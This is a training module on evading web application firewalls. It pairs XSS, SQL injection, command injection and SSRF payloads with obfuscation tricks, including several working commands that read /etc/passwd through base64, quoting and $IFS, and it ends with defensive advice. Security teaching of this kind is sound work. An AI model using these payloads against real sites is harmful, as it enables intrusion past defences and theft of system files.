# Advanced Web Security: WAF Evasion Techniques (Extended Module)

As a security professional, it is critical to understand that Web Application Firewalls (WAFs) are essentially rule-matching engines. They inspect HTTP traffic and apply regular expressions (Regex) or behavioral analysis to block malicious payloads. However, they are fundamentally constrained by the need to avoid **false positives** (blocking legitimate traffic). Attackers exploit this operational limitation.

This module details the methodologies attackers use to mutate their payloads so they slip past the WAF's signatures but are still executed maliciously by the backend application or database.

---

## 1. Encoding and Obfuscation Deep-Dive

When a WAF inspects a payload, it relies on decoding the data to read it. If the attacker uses an encoding scheme the WAF doesn't support—or nests encodings deeper than the WAF is configured to check—the payload passes through as "safe" gibberish, only to be decoded and executed by the backend.

### URL and Nested URL Encoding
WAFs typically decode standard URL encoding once or twice. If a backend framework recursively decodes inputs, nesting encodings can bypass the WAF.

* **Standard Payload:** `<script>alert(1)</script>`
* **URL Encoded (1st pass):** `%3Cscript%3Ealert(1)%3C%2Fscript%3E`
* **Double URL Encoded (2nd pass):** `%253Cscript%253Ealert(1)%253C%252Fscript%253E`
* **Triple URL Encoded (3rd pass):** `%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E`

### HTML Entity Encoding (XSS Specific)
If your payload lands inside an HTML attribute (like `<img src=x onerror="...">`), browsers will automatically HTML-decode the payload before executing the JavaScript. WAFs often miss this.

* **Payload:** `javascript:alert(1)`
* **HTML Decimal Entity:** `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;`
* **HTML Hex Entity:** `&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;`
* **Mixed Entity with padding:** `&#x000006A;avascript:alert(1)` (Adding padded zeros confuses regex filters).

### Base64 Execution (JS & OS Level)
If strings like `<script>` or `/bin/bash` are blocked, Base64 encoding the payload and using native functions to decode and execute it on the fly is highly effective.

* **JavaScript (Bypassing `alert` blocks):** 
  `<script>eval(atob('YWxlcnQoMSk='))</script>` *(Decodes to `alert(1)`)*
* **Linux Command Line (Bypassing `cat` or `wget` blocks):**
  `` `echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh` `` *(Decodes to `cat /etc/passwd`)*

### Unicode / UTF-8 Anomalies
Web servers and databases often normalize strange Unicode characters (Homoglyphs) into their standard ASCII equivalents.

* **Payload:** `SELECT`
* **Overlong UTF-8:** `%C0%B3%C0%A5%C0%AC%C0%A5%C0%A3%C0%B4`
* **Fullwidth Characters:** `ＳＥＬＥＣＴ` (MySQL often normalizes these back to standard `SELECT`).
* **IIS Unicode Bypass:** `%u0053%u0045%u004C%u0045%u0043%u0054`

---

## 2. String Manipulation and Syntax Breaking

If a WAF uses strict Regular Expressions to block specific keywords (e.g., `UNION`, `SELECT`, `alert`, `prompt`), we can break those keywords apart. 

### Case Toggling
If the WAF's regex is poorly written (lacking case insensitivity), simply mixing upper and lowercase letters works.

* **XSS:** `<sCrIpT>aLeRt(1)</ScRiPt>`
* **SQLi:** `uNiOn SeLeCt 1,2,3`

### Concatenation and Dynamic Execution
We can split dangerous keywords and rely on the execution environment to stitch them back together before execution.

* **SQL Server (+):** `EXEC('s' + 'e' + 'l' + 'e' + 'c' + 't')`
* **MySQL/Oracle (||):** `'un'||'ion' 'sel'||'ect'`
* **JavaScript String Math:** `window['al' + 'ert'](1)` or `setTimeout('al' + 'ert(1)')`
* **Linux Bash (Quotes):** `/bin/ca't' /etc/pas'sw'd` or `/bin/c"a"t /etc/p"a"sswd` (Bash ignores the quotes, the WAF doesn't see the word `cat`).

### JavaScript Object Obfuscation (JSFuck concepts)
JavaScript is incredibly malleable. You can execute code without using alphanumeric characters at all, bypassing nearly all keyword-based WAFs.

* **Bypassing `alert(1)`:** `[]["filter"]["constructor"]("al"+"ert(1)")()`
* **Using Backticks instead of parenthesis:** `alert`1`` (Valid JS in ES6+)

---

## 3. Whitespace and Separator Evasion

Many WAF rules rely on matching spaces between keywords (e.g., `UNION SELECT`). If we replace spaces with other characters that the backend parser still treats as boundaries, the regex fails.

### SQL Injection Whitespace Alternatives
If ` ` (space) or `%20` is blocked, databases accept many other characters as separators:

* **Inline Comments:** `UNION/**/SELECT/**/1,2,3`
* **Line Breaks / Tabs (URL Encoded):** `UNION%0D%0ASELECT%091,2,3`
* **Parentheses (No spaces needed):** `UNION(SELECT(1),(2),(3))`

### Linux Command Whitespace Alternatives
If the space character is blocked in Command Injection vulnerabilities, Linux provides built-in environment variables and syntax tricks to bypass it.

* **Using `$IFS` (Internal Field Separator):** `cat$IFS/etc/passwd` or `cat${IFS}/etc/passwd`
* **Using Brace Expansion:** `{cat,/etc/passwd}`
* **Using Input Redirection:** `cat</etc/passwd`

---

## 4. Protocol and HTTP-Level Evasion

These techniques exploit differences in how the WAF and the backend server parse the actual HTTP protocol (Impedance Mismatch).

### HTTP Parameter Pollution (HPP)
What happens if you send the same parameter multiple times in a single request?
`GET /index.php?id=1&id=UNION SELECT...`

* **PHP/Apache:** Takes the *last* parameter (sees `UNION SELECT`).
* **ASP.NET/IIS:** Concatenates them with a comma (`1, UNION SELECT...`).
* **Node.js/Express:** Creates an array.

If the WAF only inspects the *first* occurrence of `id`, it sees `1` (Safe). The backend application uses the *last* occurrence, executing the payload.

### Multipart/Form-Data Boundary Manipulation
When uploading files or sending POST data, HTTP uses a `boundary` to separate fields. WAFs strictly parse these boundaries.

```http
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
```

* **Bypass Trick:** Add extra whitespace to the boundary definition: `boundary= ----WebKitFormBoundary`. The WAF might fail to parse the body entirely, ignoring the payload, while robust backend parsers like PHP might trim the space and read the payload successfully.

### HTTP Method Spoofing
Sometimes WAF rules are only applied to `GET` and `POST` requests.
* Send the payload via a `PUT` or `PATCH` request. If the backend API routes indiscriminately (e.g., using `$_REQUEST` in PHP), the payload executes without WAF inspection.

---

## 5. Network and IP Obfuscation (For SSRF and RCE)

When exploiting Server-Side Request Forgery (SSRF) or downloading secondary payloads via RCE, WAFs often block internal IPs (like `127.0.0.1` or `10.0.0.1`). We can represent IPs in formats the WAF doesn't recognize, but the OS network stack resolves perfectly.

* **Standard IP:** `127.0.0.1`
* **Decimal IP:** `2130706433` (Ping it in your terminal, it works!)
* **Hex IP:** `0x7f000001` or `0x7f.0x00.0x00.0x01`
* **Octal IP:** `0177.0000.0000.0001`
* **IPv6 Localhost:** `[::]` or `0000::1`
* **Missing Zeros:** `127.1` (Resolves to 127.0.0.1 on most OS stacks)

---

## Instructor's Conclusion: The "Defense In Depth" Reality

As a security engineer, you must realize that **WAFs are easily bypassed by a determined attacker.** They buy you time during an active incident, but they are not a substitute for secure coding.

**Your Defensive Action Plan:**

1. **Secure the Code First:** Implement parameterized queries for SQL, use strict allow-lists for input validation, and utilize secure templating engines to prevent XSS.
2. **Canonicalization:** Ensure your WAF normalizes and decodes all input (URL, Hex, Unicode) *before* applying its security rules.
3. **Behavioral over Signature:** Shift toward modern WAFs that analyze anomalous application behavior and request rates, rather than relying strictly on outdated regex signatures.